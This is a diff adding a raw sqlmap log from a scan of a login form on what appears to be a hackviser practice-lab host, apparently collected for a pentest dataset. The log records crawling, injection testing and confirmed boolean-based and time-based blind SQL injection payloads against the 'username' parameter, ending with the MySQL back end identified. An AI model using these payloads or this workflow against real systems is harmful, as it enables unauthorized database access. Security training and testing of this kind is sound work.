@@ -1,0 +1,124 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.8#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:27:50 /2025-11-08/
+
+[18:27:50] [WARNING] using '/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/web_recon_dataset/sqlmap_scan_20251108_182749' as the output directory
+[18:27:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[18:27:50] [INFO] starting crawler for target URL 'https://relevant-harpoon.europe1.hackviser.space/login.php?username=FUZZ&password=FUZZ'
+[18:27:50] [INFO] searching for links with depth 1
+[18:27:50] [INFO] starting 2 threads
+got a 302 redirect to 'https://relevant-harpoon.europe1.hackviser.space/login.php'. Do you want to follow? [Y/n] Y
+[18:27:51] [INFO] searching for links with depth 2
+[18:27:51] [INFO] starting 2 threads
+[18:27:52] [INFO] heuristics detected web page charset 'utf-8'
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[18:27:53] [INFO] found a total of 2 targets
+[1/2] Form:
+POST https://relevant-harpoon.europe1.hackviser.space/login.php?username=FUZZ&password=FUZZ
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
+do you want to fill blank fields with random values? [Y/n] Y
+[18:27:53] [INFO] using '/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/web_recon_dataset/sqlmap_scan_20251108_182749/results-11082025_0627pm.csv' as the CSV results file in multiple targets mode
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=68a5cpcnmh5...h5igtj6cib'). Do you want to use those [Y/n] Y
+[18:27:53] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:27:54] [INFO] testing if the target URL content is stable
+[18:27:54] [INFO] target URL content is stable
+[18:27:54] [INFO] testing if POST parameter 'username' is dynamic
+[18:27:55] [WARNING] POST parameter 'username' does not appear to be dynamic
+[18:27:55] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[18:27:56] [INFO] testing for SQL injection on POST parameter 'username'
+[18:27:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:28:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[18:28:11] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
+[18:28:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y
+[18:28:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[18:28:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[18:28:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[18:28:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[18:28:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[18:28:24] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[18:28:24] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[18:28:25] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[18:28:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[18:28:26] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[18:28:26] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[18:28:27] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[18:28:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[18:28:28] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[18:28:28] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[18:28:29] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[18:28:29] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[18:28:30] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[18:28:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[18:28:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[18:28:31] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[18:28:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[18:28:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[18:28:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[18:28:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[18:28:31] [INFO] testing 'Generic inline queries'
+[18:28:31] [INFO] testing 'MySQL inline queries'
+[18:28:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[18:28:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[18:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[18:28:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[18:28:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[18:28:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[18:28:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[18:28:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[18:28:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:28:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:28:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:28:50] [INFO] target URL appears to have 11 columns in query
+got a 302 redirect to 'https://relevant-harpoon.europe1.hackviser.space/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[18:30:37] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[18:30:47] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[18:30:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[18:31:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[18:31:19] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[18:31:29] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[18:31:38] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[18:31:48] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[18:31:57] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[18:32:08] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[18:32:18] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[18:32:29] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[18:32:38] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 429 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=eCgc' AND 2650=(SELECT (CASE WHEN (2650=2650) THEN 2650 ELSE (SELECT 8352 UNION SELECT 8806) END))-- gQPj&password=BqXv
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=eCgc' AND (SELECT 2766 FROM (SELECT(SLEEP(5)))reLU) AND 'RYWN'='RYWN&password=BqXv
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:32:44] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx, PHP
+back-end DBMS: MySQL >= 5.0.12
+[18:32:46] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 306 times
+[18:32:46] [INFO] skipping 'https://relevant-harpoon.europe1.hackviser.space/login.php'
+[18:32:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/mnt/c/Users/awad/Downloads/pyarmor/auto_PenTest/web_recon_dataset/sqlmap_scan_20251108_182749/results-11082025_0627pm.csv'
+
+[*] ending @ 18:32:46 /2025-11-08/
+
